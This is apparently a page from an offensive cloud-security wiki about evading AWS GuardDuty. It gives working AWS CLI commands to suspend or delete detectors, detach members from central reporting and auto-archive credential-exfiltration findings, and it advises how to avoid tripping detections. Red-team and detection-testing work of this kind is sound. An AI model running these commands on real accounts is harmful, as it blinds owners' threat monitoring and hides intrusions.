---
title: "GuardDuty: disabling detectors and archiving findings"
description: "Disabling detectors, suspending findings, and evading GuardDuty analytics to avoid threat detection."
keywords:
  - GuardDuty
  - detector
  - findings
  - evasion
  - detection
---

# GuardDuty

GuardDuty scores CloudTrail, VPC flow, and DNS activity for known-bad behavior. It is defeated two ways: switch it off (loud, and itself a finding), or stay inside its blind spots so it never fires.

## Disable or delete the detector

```bash
aws guardduty list-detectors
aws guardduty update-detector --detector-id <id> --no-enable      # suspend analysis
aws guardduty delete-detector --detector-id <id>                  # remove entirely
# in a delegated-admin setup, cut a member loose from central reporting
aws guardduty disassociate-from-administrator-account --detector-id <id>
```

## Auto-archive the findings you expect to trip

```bash
# a filter with ARCHIVE silently files matching findings away from the console
aws guardduty create-filter --detector-id <id> --name quiet --action ARCHIVE \
  --finding-criteria '{"Criterion":{"type":{"Eq":["UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration"]}}}'
```

## Stay in the blind spots

- Call the API from inside the account's expected regions and from an EC2 role rather than external keys, so credential-exfiltration analytics do not trip.
- Avoid Tor, known-malicious IPs, and the `GeneratedFindingFor` pentest patterns GuardDuty ships sample rules for.
- Use IMDSv2 and existing roles instead of patterns that match `InstanceCredentialExfiltration`.

## Exploitation notes

- Disabling or deleting a detector is a management event CloudTrail records, so pair it with the [CloudTrail](cloudtrail.md) work or expect it to surface.
- Filters are quieter than deletion: the service stays "enabled" while the findings you generate are archived out of view.
- GuardDuty is regional; a detector exists per region, so enumerate and handle each region in scope.

## Tools

- **AWS CLI** (`guardduty`): detector and filter control.
- **Pacu** (`detection__enum_services`, `detection__disruption`): find and disable detection services.
- **Stratus Red Team**: GuardDuty detector-deletion detonation.

## References

- [HackTricks Cloud: GuardDuty evasion](https://cloud.hacktricks.wiki/en/pentesting-cloud/aws-security/aws-defense-evasion/index.html)
- [Stratus Red Team: delete GuardDuty detector](https://stratus-red-team.cloud/attack-techniques/AWS/aws.defense-evasion.guardduty-disable/)
- [AWS: GuardDuty finding types](https://docs.aws.amazon.com/guardduty/latest/ug/guardduty_finding-types-active.html)
